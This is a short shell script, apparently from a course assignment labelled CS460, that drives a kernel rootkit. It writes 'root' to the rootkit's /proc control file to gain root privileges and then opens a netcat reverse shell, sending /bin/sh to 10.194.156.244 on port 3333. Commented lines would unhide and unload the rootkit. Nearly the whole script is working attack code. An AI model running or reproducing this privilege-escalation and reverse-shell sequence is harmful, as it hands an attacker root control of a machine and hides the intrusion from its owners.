#/bin/sh


echo "root" > /proc/CS460/status
/bin/nc.traditional -c /bin/sh 10.194.156.244 3333

#echo "unhide" > /proc/CS460/status
#rmmod rootkit